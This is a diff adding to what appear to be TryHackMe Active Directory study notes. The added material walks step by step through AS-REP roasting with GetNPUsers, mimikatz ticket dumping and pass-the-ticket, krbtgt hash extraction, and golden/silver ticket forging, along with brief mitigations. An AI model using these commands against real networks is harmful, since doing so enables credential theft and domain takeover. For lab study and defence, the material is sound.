@@ -519,6 +519,8 @@ During pre-authentication, the users hash will be used to encrypt a timestamp th
 ![image](https://user-images.githubusercontent.com/89842187/131724074-5b222aa9-85bb-4f4c-804d-ca562f968c52.png)
 
 ```
+sudo python3 GetNPUsers.py controller/ -usersfile usernames2.txt -format hashcat -outputfile hashes.asreproast
+
 Rubeus.exe asreproast
 ```
 
@@ -526,3 +528,134 @@ Rubeus.exe asreproast
 
 - Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
 - Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
+
+
+## Pass the Ticket w/ mimikatz
+
+Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory
+
+This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.
+
+You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.
+
+## Pass the Ticket Overview 
+
+Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
+
+![image](https://user-images.githubusercontent.com/89842187/131734848-12249a43-9a92-4896-a21a-434aa5fd2402.png)
+
+## Prepare Mimikatz & Dump Tickets 
+
+You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
+
+```
+1.) cd Downloads - navigate to the directory mimikatz is in
+
+2.) mimikatz.exe - run mimikatz
+
+3.) privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+```
+![image](https://user-images.githubusercontent.com/89842187/131734978-081578ae-b49b-4ba6-9658-72bfa1cd4415.png)
+
+```
+4.) sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in
+
+At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
+```
+![image](https://user-images.githubusercontent.com/89842187/131735029-762b0928-a51f-486b-84b0-455be0454a02.png)
+
+When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
+
+## Pass the Ticket w/ Mimikatz
+
+Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+```
+1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+```
+![image](https://user-images.githubusercontent.com/89842187/131735093-688f533d-c6e0-4b94-b7ee-e239d3a5f8a2.png)
+
+```
+2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+
+We will not be using mimikatz for the rest of the attack.
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131735140-52109cea-1e3b-4d5d-a69b-30c47c3076f9.png)
+
+```
+3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131735175-04a2aa5c-171e-403e-a8cc-c4e03f841fac.png)
+
+Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.
+
+## Pass the Ticket Mitigation 
+
+Let's talk blue team and how to mitigate these types of attacks. 
+
+- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
+
+
+## Golden/Silver Ticket Attacks w/ mimikatz
+
+
+Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.
+
+A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
+
+A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.
+
+## KRBTGT Overview 
+
+In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.
+
+## Golden/Silver Ticket Attack Overview - 
+
+A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
+
+![image](https://user-images.githubusercontent.com/89842187/131737036-fc7e1d7b-b2ab-4572-ab48-0a065d82f3ab.png)
+
+## Dump the krbtgt hash
+
+```
+﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz
+
+2.) privilege::debug - ensure this outputs [privilege '20' ok]
+
+﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+
+```
+
+﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz
+
+2.) privilege::debug - ensure this outputs [privilege '20' ok]
+
+﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+
+## Create a Golden/Silver Ticket 
+
+```
+﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131737142-447ed0ca-3cb1-44c0-920d-daad355a4be7.png)
+
+## Use the Golden/Silver Ticket to access other machines 
+
+```
+﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
+```
+![image](https://user-images.githubusercontent.com/89842187/131739125-f91da1bf-fde5-4db5-aaa4-7115d20833a2.png)
+
+```
+2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+```
+
+![image](https://user-images.githubusercontent.com/89842187/131739153-aacd7c3b-b977-4b11-9191-1705ec3fd60f.png)
+
+This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.
+
